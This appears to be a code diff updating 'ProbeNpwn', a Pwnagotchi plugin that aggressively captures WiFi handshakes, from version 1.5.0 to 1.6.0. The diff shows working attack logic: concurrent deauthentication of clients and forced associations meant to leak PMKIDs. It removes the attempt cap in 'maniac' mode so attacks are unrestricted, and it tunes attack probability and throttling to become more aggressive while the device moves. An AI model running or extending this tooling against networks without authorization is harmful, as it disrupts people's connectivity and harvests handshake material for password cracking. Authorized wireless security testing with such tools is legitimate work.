@@ -8,8 +8,8 @@ import pwnagotchi.plugins as plugins
 import pwnagotchi.ui.components as components
 from concurrent.futures import ThreadPoolExecutor
 from queue import PriorityQueue
-import multiprocessing # For cpu_count
-import math # For haversine distance
+import multiprocessing  # For cpu_count
+import math  # For haversine distance
 import heapq
 import bisect
 from collections import OrderedDict, defaultdict
@@ -20,7 +20,7 @@ except ImportError:
 
 class ProbeNpwn(plugins.Plugin):
     __author__ = 'AlienMajik'
-    __version__ = '1.5.0' # Updated with continuous mobility scaling
+    __version__ = '1.6.0'  # Updated with enhancements and fixes
     __license__ = 'GPL3'
     __description__ = (
         'Aggressively capture handshakes with two modes: Tactical (smart and efficient) and Maniac '
@@ -39,29 +39,32 @@ class ProbeNpwn(plugins.Plugin):
     MAX_AP_CLIENTS = 1000
     MAX_AP_GROUPS = 1000
     MAX_CLIENTS_PER_AP = 100
-    DELAY_CACHE_TTL = 10 # seconds
+    DELAY_CACHE_TTL = 10  # seconds
+    GPS_HISTORY_MAX_AGE = 300  # seconds, for pruning old GPS entries
+
     def __init__(self):
         logging.debug("ProbeNpwn plugin created")
         self.old_name = None
         self.recents = {}
-        self.recent_heap = [] # [(track_time, mac)]
+        self.recent_heap = []  # [(track_time, mac)]
         self.executor = None
+        self.executor_lock = threading.Lock()
         self._watchdog_thread = None
         self._watchdog_thread_running = True
         self.attack_attempts = {}
         self.success_counts = {}
-        self.channel_success = defaultdict(int) # int(channel): count
+        self.channel_success = defaultdict(int)  # int(channel): count
         self.total_handshakes = 0
         self.performance_stats = {}
         self.whitelist = set()
         self.cooldowns = {}
         self.epoch_duration = 60
-        self.ap_clients = OrderedDict() # ap_mac: count
-        self.channel_activity = defaultdict(lambda: {"aps": 0, "clients": 0}) # int(channel): dict
-        self.client_scores = OrderedDict() # cl_mac: score
-        self.ap_client_groups = OrderedDict() # ap_mac: [cl_macs]
+        self.ap_clients = OrderedDict()  # ap_mac: count
+        self.channel_activity = defaultdict(lambda: {"aps": 0, "clients": 0})  # int(channel): dict
+        self.client_scores = OrderedDict()  # cl_mac: score
+        self.ap_client_groups = OrderedDict()  # ap_mac: [cl_macs]
         self.mode = "tactical"
-        self.retry_queue = PriorityQueue() # unbounded
+        self.retry_queue = PriorityQueue()  # unbounded
         self.handshake_db = set()
         self.attacks_x = 10
         self.attacks_y = 20
@@ -78,7 +81,7 @@ class ProbeNpwn(plugins.Plugin):
         self.new_aps_per_epoch = 0
         self.epoch_count = 0
         self.env_check_interval = 10
-        self.gps_history = [] # list of (time, {'Latitude':, 'Longitude':})
+        self.gps_history = []  # list of (time, {'Latitude':, 'Longitude':})
         self.gps_history_size = 5
         # Min/max for scaling (loaded from config)
         self.min_recon_time = 2
@@ -99,18 +102,19 @@ class ProbeNpwn(plugins.Plugin):
         self.max_throttle_d = 0.2
         # Multi-band support
         self.enable_5ghz = False
-        self.possible_channels = list(range(1, 14)) # Default 2.4GHz
+        self.possible_channels = list(range(1, 14))  # Default 2.4GHz
         self.five_ghz_channels = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
         # Watchdog enhancements
         self.restart_attempts = 0
         self.last_restart_time = 0
         self.max_restarts_per_hour = 3
         # Delay cache
-        self.delay_cache = {} # {(ap_mac, cl_mac): (delay, timestamp)}
+        self.delay_cache = {}  # {(ap_mac, cl_mac): (delay, timestamp)}
         # Concurrency lock
         self.channel_lock = threading.Lock()
         # Retry config
         self.max_retries = 3
+
     ### Lifecycle Methods
     def on_loaded(self):
         logging.info("Plugin ProbeNpwn loaded")
@@ -124,6 +128,7 @@ class ProbeNpwn(plugins.Plugin):
             except Exception as e:
                 logging.warning(f"Failed to clear pycache: {e}")
         self.executor = ThreadPoolExecutor(max_workers=self.get_dynamic_max_workers())
+
     def on_config_changed(self, config):
         self.whitelist = {item.lower() for item in config["main"].get("whitelist", [])}
         self.verbose = config.get("main", {}).get("plugins", {}).get("probenpwn", {}).get("verbose", False)
@@ -157,10 +162,13 @@ class ProbeNpwn(plugins.Plugin):
         self.max_throttle_a = config["main"]["plugins"]["probenpwn"].get("max_throttle_a", 0.2)
         self.min_throttle_d = config["main"]["plugins"]["probenpwn"].get("min_throttle_d", 0.1)
         self.max_throttle_d = config["main"]["plugins"]["probenpwn"].get("max_throttle_d", 0.2)
+        # Set possible channels with unique values
+        self.possible_channels = list(range(1, 14))
         if self.enable_5ghz:
-            self.possible_channels += self.five_ghz_channels
+            self.possible_channels = list(set(self.possible_channels + self.five_ghz_channels))
         # Apply initial adjustments
         self.apply_scaling(config)
+
     def on_unload(self, ui):
         with ui._lock:
             if self.old_name:
@@ -172,8 +180,10 @@ class ProbeNpwn(plugins.Plugin):
         self._watchdog_thread_running = False
         if self._watchdog_thread:
             self._watchdog_thread.join()
-        self.executor.shutdown(wait=True)
+        with self.executor_lock:
+            self.executor.shutdown(wait=True)
         logging.info("Probing out.")
+
     ### UI Methods
     def on_ui_setup(self, ui):
         if not self.ui_initialized:
@@ -182,6 +192,7 @@ class ProbeNpwn(plugins.Plugin):
             ui.add_element('handshakes', components.Text(position=(self.handshakes_x, self.handshakes_y), value='Handshakes: 0', color=255))
             ui.add_element('mobility', components.Text(position=(self.handshakes_x, self.handshakes_y + 10), value='Mobility: 0%', color=255))
             self.ui_initialized = True
+
     def on_ui_update(self, ui):
         current_time = time.time()
         if current_time - self.last_ui_update < self.ui_update_interval:
@@ -199,6 +210,7 @@ class ProbeNpwn(plugins.Plugin):
         with ui._lock:
             for key, value in ui_changes.items():
                 ui.set(key, value)
+
     ### Core Functionality
     def on_ready(self, agent):
         logging.info("Probed and Pwnd!")
@@ -207,6 +219,7 @@ class ProbeNpwn(plugins.Plugin):
         self._watchdog_thread.start()
         with agent._view._lock:
             agent._view.set("status", "Probe engaged..." if self.mode == "tactical" else "Maniac mode activated!")
+
     def _watchdog(self, agent):
         CHECK_INTERVAL = 10
         MAX_RETRIES = 1
@@ -219,29 +232,32 @@ class ProbeNpwn(plugins.Plugin):
                     subprocess.run(["monstart"], check=True, capture_output=True)
                     logging.info("Soft recovery successful")
                     retry_count = 0
+                except subprocess.CalledProcessError as e:
+                    logging.error(f"Soft recovery failed: {e}\nStdout: {e.stdout.decode()}\nStderr: {e.stderr.decode()}")
+                    retry_count += 1
                 except Exception as e:
                     logging.error(f"Soft recovery failed: {e}")
                     retry_count += 1
-                    if retry_count >= MAX_RETRIES:
-                        current_time = time.time()
-                        if current_time - self.last_restart_time > 3600:
-                            self.restart_attempts = 0
-                        if self.restart_attempts < self.max_restarts_per_hour:
-                            delay = 2 ** self.restart_attempts
-                            logging.info(f"Restarting pwnagotchi after {delay}s backoff (attempt {self.restart_attempts + 1})")
-                            time.sleep(delay)
-                            try:
-                                result = subprocess.run(["systemctl", "restart", "pwnagotchi"], check=True, capture_output=True)
-                                logging.info("Restart successful")
-                                self.restart_attempts += 1
-                                self.last_restart_time = current_time
-                            except subprocess.CalledProcessError as ex:
-                                logging.error(f"Restart failed: {ex}\nStdout: {ex.stdout}\nStderr: {ex.stderr}")
-                            except Exception as ex:
-                                logging.error(f"Restart failed: {ex}")
-                        else:
-                            logging.error("Max restarts per hour reached. Halting recovery attempts.")
-                            break
+                if retry_count >= MAX_RETRIES:
+                    current_time = time.time()
+                    if current_time - self.last_restart_time > 3600:
+                        self.restart_attempts = 0
+                    if self.restart_attempts < self.max_restarts_per_hour:
+                        delay = 2 ** self.restart_attempts
+                        logging.info(f"Restarting pwnagotchi after {delay}s backoff (attempt {self.restart_attempts + 1})")
+                        time.sleep(delay)
+                        try:
+                            result = subprocess.run(["systemctl", "restart", "pwnagotchi"], check=True, capture_output=True)
+                            logging.info("Restart successful")
+                            self.restart_attempts += 1
+                            self.last_restart_time = current_time
+                        except subprocess.CalledProcessError as ex:
+                            logging.error(f"Restart failed: {ex}\nStdout: {ex.stdout.decode()}\nStderr: {ex.stderr.decode()}")
+                        except Exception as ex:
+                            logging.error(f"Restart failed: {ex}")
+                    else:
+                        logging.error("Max restarts per hour reached. Halting recovery attempts.")
+                        break
             else:
                 retry_count = 0
             agent.set_channel(self.select_channel())
@@ -250,9 +266,11 @@ class ProbeNpwn(plugins.Plugin):
             new_workers = self.get_dynamic_max_workers()
             if new_workers != current_workers:
                 logging.info(f"Adjusting concurrency from {current_workers} to {new_workers}")
-                self.executor.shutdown(wait=True)
-                self.executor = ThreadPoolExecutor(max_workers=new_workers)
+                with self.executor_lock:
+                    self.executor.shutdown(wait=True)
+                    self.executor = ThreadPoolExecutor(max_workers=new_workers)
             time.sleep(CHECK_INTERVAL)
+
     def select_channel(self):
         if not self.channel_activity:
             return random.choice(self.possible_channels)
@@ -273,6 +291,7 @@ class ProbeNpwn(plugins.Plugin):
         pick = random.random() * total_weight
         i = bisect.bisect(cum_weights, pick)
         return channels[i]
+
     def track_recent(self, ap, cl=None):
         current_time = time.time()
         ap_mac_lower = ap['mac'].lower()
@@ -284,12 +303,22 @@ class ProbeNpwn(plugins.Plugin):
             cl['_track_time'] = current_time
             self.recents[cl_mac_lower] = cl
             heapq.heappush(self.recent_heap, (current_time, cl_mac_lower))
+
     def ok_to_attack(self, agent, ap):
         if self.mode == "maniac":
             return True
-        ap_mac_lower = ap['mac'].lower()
-        ap_hostname_lower = ap.get('hostname', '').lower()
-        return ap_hostname_lower not in self.whitelist and ap_mac_lower not in self.whitelist
+        try:
+            ap_mac_lower = str(ap['mac']).lower()
+            ap_hostname_lower = str(ap.get('hostname', '')).lower()
+        except Exception:
+            return False
+        if ap_hostname_lower in self.whitelist or ap_mac_lower in self.whitelist:
+            return False
+        # Add RSSI check
+        if ap.get('rssi', -100) < self.get_scaled_param('min_rssi'):
+            return False
+        return True
+
     def attack_target(self, agent, ap, cl, retry_count=0):
         if retry_count > self.max_retries:
             return
@@ -302,35 +331,61 @@ class ProbeNpwn(plugins.Plugin):
                 self.retry_counter += 1
                 self.retry_queue.put((retry_time, self.retry_counter, (agent, ap, cl, retry_count + 1)))
                 return
-        elif self.mode == "maniac" and self.attack_attempts.get(ap_mac, 0) > 50:
-            retry_time = time.time() + 60
-            self.retry_counter += 1
-            self.retry_queue.put((retry_time, self.retry_counter, (agent, ap, cl, retry_count + 1)))
-            return
+        # Removed attempts cap for maniac mode to make it unrestricted
         if not self.ok_to_attack(agent, ap):
+            return
+        # Add client RSSI check if present
+        if cl and cl.get('rssi', -100) < self.get_scaled_param('min_rssi'):
             return
         with self.channel_lock:
             agent.set_channel(ap['channel'])
         self.attack_attempts[ap_mac] = self.attack_attempts.get(ap_mac, 0) + 1
         logging.info(f"Attacking AP {ap_mac} (client: {cl['mac'] if cl else 'N/A'}) retry_count: {retry_count}")
-        if agent._config['personality']['deauth']:
+        if agent._config['personality']['deauth'] and random.random() < self.get_scaled_param('deauth_prob'):
+            throttle_d = self.dynamic_attack_delay(ap, cl) * self.get_scaled_param('throttle_d')
             if ap_mac in self.ap_client_groups:
                 for cl_mac in self.ap_client_groups[ap_mac][:5]:
                     client_data = self.recents.get(cl_mac)
                     if client_data:
-                        self.executor.submit(agent.deauth, ap, client_data, self.dynamic_attack_delay(ap, client_data))
+                        try:
+                            with self.executor_lock:
+                                self.executor.submit(agent.deauth, ap, client_data, throttle=throttle_d)
+                        except RuntimeError as e:
+                            if 'cannot schedule new futures after shutdown' in str(e):
+                                logging.warning("Executor shutdown race detected; retrying submit")
+                                # Optionally add sleep or queue
+                            else:
+                                raise
                     else:
                         logging.warning(f"Untracked client {cl_mac} for AP {ap_mac}")
             elif cl:
                 if 'mac' in cl:
-                    self.executor.submit(agent.deauth, ap, cl, self.dynamic_attack_delay(ap, cl))
+                    try:
+                        with self.executor_lock:
+                            self.executor.submit(agent.deauth, ap, cl, throttle=throttle_d)
+                    except RuntimeError as e:
+                        if 'cannot schedule new futures after shutdown' in str(e):
+                            logging.warning("Executor shutdown race detected; retrying submit")
+                            # Optionally add sleep or queue
+                        else:
+                            raise
                 else:
                     logging.warning(f"Invalid client data for AP {ap_mac}")
-        # Add PMKID-focused assoc
-        if random.random() < self.get_scaled_param('assoc_prob'):
-            self.executor.submit(agent.associate, ap, throttle_a=0.05)  # Force PMKID leak
-        if random.random() < 0.2:
-            self.executor.submit(agent.associate, ap, 0.05)
+        # PMKID-focused assoc, always if no clients
+        has_clients = bool(cl or self.ap_client_groups.get(ap_mac))
+        assoc_prob = 1.0 if not has_clients else self.get_scaled_param('assoc_prob')
+        if random.random() < assoc_prob:
+            throttle_a = self.dynamic_attack_delay(ap, cl) * self.get_scaled_param('throttle_a')
+            try:
+                with self.executor_lock:
+                    self.executor.submit(agent.associate, ap, throttle=throttle_a)
+            except RuntimeError as e:
+                if 'cannot schedule new futures after shutdown' in str(e):
+                    logging.warning("Executor shutdown race detected; retrying submit")
+                    # Optionally add sleep or queue
+                else:
+                    raise
+
     def dynamic_attack_delay(self, ap, cl):
         cl_mac = cl['mac'].lower() if cl else ''
         key = (ap['mac'].lower(), cl_mac)
@@ -352,6 +407,7 @@ class ProbeNpwn(plugins.Plugin):
             delay = base_delay * (0.95 + random.random() * 0.1)
         self.delay_cache[key] = (delay, current_time)
         return delay
+
     def get_dynamic_max_workers(self):
         try:
             if psutil:
@@ -368,12 +424,16 @@ class ProbeNpwn(plugins.Plugin):
             return base_workers
         except Exception:
             return 20
+
     def calculate_mobility_score(self, agent):
         gps = agent.session().get('gps', None)
         current_time = time.time()
         speed_norm = 0.0
         if gps and 'Latitude' in gps and gps['Latitude'] != 0 and 'Longitude' in gps and gps['Longitude'] != 0:
             current_gps = {'Latitude': gps['Latitude'], 'Longitude': gps['Longitude']}
+            # Time-based pruning
+            while self.gps_history and current_time - self.gps_history[0][0] > self.GPS_HISTORY_MAX_AGE:
+                self.gps_history.pop(0)
             self.gps_history.append((current_time, current_gps))
             if len(self.gps_history) > self.gps_history_size:
                 self.gps_history.pop(0)
@@ -387,8 +447,8 @@ class ProbeNpwn(plugins.Plugin):
                 dlat, dlon = lat2 - lat1, lon2 - lon1
                 a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
                 c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
-                distance = 6371 * c # km
-                speed = (distance / time_delta) * 3600 # km/h
+                distance = 6371 * c  # km
+                speed = (distance / time_delta) * 3600  # km/h
                 if speed < 200:
                     speeds.append(speed)
                 else:
@@ -403,6 +463,7 @@ class ProbeNpwn(plugins.Plugin):
         # Combined score
         score = max(speed_norm, ap_rate_norm)
         return score
+
     def get_scaled_param(self, param_name):
         if param_name == 'recon_time':
             return self.max_recon_time - (self.mobility_score * (self.max_recon_time - self.min_recon_time))
@@ -411,22 +472,28 @@ class ProbeNpwn(plugins.Plugin):
         elif param_name == 'sta_ttl':
             return self.max_sta_ttl - (self.mobility_score * (self.max_sta_ttl - self.min_sta_ttl))
         elif param_name == 'deauth_prob':
-            return self.max_deauth_prob - (self.mobility_score * (self.max_deauth_prob - self.min_deauth_prob))
+            # Inverted for aggression: increase prob with mobility
+            return self.min_deauth_prob + (self.mobility_score * (self.max_deauth_prob - self.min_deauth_prob))
         elif param_name == 'assoc_prob':
-            return self.max_assoc_prob - (self.mobility_score * (self.max_assoc_prob - self.min_assoc_prob))
+            # Inverted for aggression: increase prob with mobility
+            return self.min_assoc_prob + (self.mobility_score * (self.max_assoc_prob - self.min_assoc_prob))
         elif param_name == 'min_rssi':
             return self.min_min_rssi + (self.mobility_score * (self.max_min_rssi - self.min_min_rssi))
         elif param_name == 'throttle_a':
-            return self.min_throttle_a + (self.mobility_score * (self.max_throttle_a - self.min_throttle_a))
+            # Inverted for aggression: decrease throttle with mobility
+            return self.max_throttle_a - (self.mobility_score * (self.max_throttle_a - self.min_throttle_a))
         elif param_name == 'throttle_d':
-            return self.min_throttle_d + (self.mobility_score * (self.max_throttle_d - self.min_throttle_d))
+            # Inverted for aggression: decrease throttle with mobility
+            return self.max_throttle_d - (self.mobility_score * (self.max_throttle_d - self.min_throttle_d))
         return 0.0  # Default
+
     def apply_scaling(self, config):
         params = ['recon_time', 'ap_ttl', 'sta_ttl', 'deauth_prob', 'assoc_prob', 'min_rssi', 'throttle_a', 'throttle_d']
         for param in params:
             if param in config['personality']:
                 config['personality'][param] = self.get_scaled_param(param)
         logging.info(f"Applied scaled params based on mobility score {self.mobility_score:.2f}")
+
     ### Event Handlers
     def on_bcap_wifi_ap_new(self, agent, event):
         ap = event['data']
@@ -438,10 +505,19 @@ class ProbeNpwn(plugins.Plugin):
             self.ap_clients.move_to_end(ap_mac)
         if len(self.ap_clients) > self.MAX_AP_CLIENTS:
             self.ap_clients.popitem(last=False)
-        self.new_aps_per_epoch += 1 # Track for mobility score
+        self.new_aps_per_epoch += 1  # Track for mobility score
         if self.ok_to_attack(agent, ap):
             self.track_recent(ap)
-            self.executor.submit(self.attack_target, agent, ap, None)
+            try:
+                with self.executor_lock:
+                    self.executor.submit(self.attack_target, agent, ap, None)
+            except RuntimeError as e:
+                if 'cannot schedule new futures after shutdown' in str(e):
+                    logging.warning("Executor shutdown race detected; retrying submit")
+                    # Optionally add sleep or queue
+                else:
+                    raise
+
     def on_bcap_wifi_client_new(self, agent, event):
         ap = event['data']['AP']
         cl = event['data']['Client']
@@ -472,26 +548,46 @@ class ProbeNpwn(plugins.Plugin):
             self.ap_client_groups.popitem(last=False)
         if self.ok_to_attack(agent, ap):
             self.track_recent(ap, cl)
-            self.executor.submit(self.attack_target, agent, ap, cl)
+            try:
+                with self.executor_lock:
+                    self.executor.submit(self.attack_target, agent, ap, cl)
+            except RuntimeError as e:
+                if 'cannot schedule new futures after shutdown' in str(e):
+                    logging.warning("Executor shutdown race detected; retrying submit")
+                    # Optionally add sleep or queue
+                else:
+                    raise
+
     def on_handshake(self, agent, filename, ap, cl):
-        handshake_hash = hash(f"{ap['mac'].lower()}{cl.get('mac', '').lower()}")
+        if cl is None:
+            logging.warning(f"Handshake event without client for AP {ap['mac']}")
+        handshake_hash = hash(f"{ap['mac'].lower()}{cl.get('mac', '').lower() if cl else ''}")
         if handshake_hash in self.handshake_db:
             logging.info(f"Duplicate handshake for {ap['mac']}. Skipping.")
             return
         ap_mac = ap['mac'].lower()
-        ch = ap['channel'] # Track success per channel
+        ch = ap['channel']  # Track success per channel
         self.handshake_db.add(handshake_hash)
         self.success_counts[ap_mac] = self.success_counts.get(ap_mac, 0) + 1
         self.channel_success[ch] += 1
         self.total_handshakes += 1
         if self.mode == "tactical":
             self.cooldowns[ap_mac] = time.time() + 60
+
     def on_epoch(self, agent, epoch, epoch_data):
         current_time = time.time()
         while not self.retry_queue.empty() and self.retry_queue.queue[0][0] <= current_time:
             item = self.retry_queue.get()
             _, _, (agent, ap, cl, retry_count) = item
-            self.executor.submit(self.attack_target, agent, ap, cl, retry_count)
+            try:
+                with self.executor_lock:
+                    self.executor.submit(self.attack_target, agent, ap, cl, retry_count)
+            except RuntimeError as e:
+                if 'cannot schedule new futures after shutdown' in str(e):
+                    logging.warning("Executor shutdown race detected; retrying submit")
+                    # Optionally add sleep or queue
+                else:
+                    raise
         # Heap-based cleanup for recents
         while self.recent_heap and self.recent_heap[0][0] < (current_time - self.epoch_duration):
             t, mac = heapq.heappop(self.recent_heap)
@@ -505,7 +601,7 @@ class ProbeNpwn(plugins.Plugin):
             if self.attack_attempts[ap_mac] > self.success_counts.get(ap_mac, 0) + 2:
                 if ap_mac in self.recents:
                     ap = self.recents[ap_mac]
-                    cl = None # Retry without specific client
+                    cl = None  # Retry without specific client
                     retry_time = current_time + 10
                     self.retry_counter += 1
                     self.retry_queue.put((retry_time, self.retry_counter, (agent, ap, cl, 0)))
@@ -516,11 +612,13 @@ class ProbeNpwn(plugins.Plugin):
             self.mobility_score = new_score  # Direct update for continuous
             self.apply_scaling(agent._config)
             logging.info(f"Mobility score updated to {self.mobility_score:.2f}")
-            self.new_aps_per_epoch = 0 # Reset counter
+            self.new_aps_per_epoch = 0  # Reset counter
+
     def on_bcap_wifi_ap_updated(self, agent, event):
         ap = event['data']
         if self.ok_to_attack(agent, ap):
             self.track_recent(ap)
+
     def on_bcap_wifi_client_updated(self, agent, event):
         ap = event['data']['AP']
         cl = event['data']['Client']
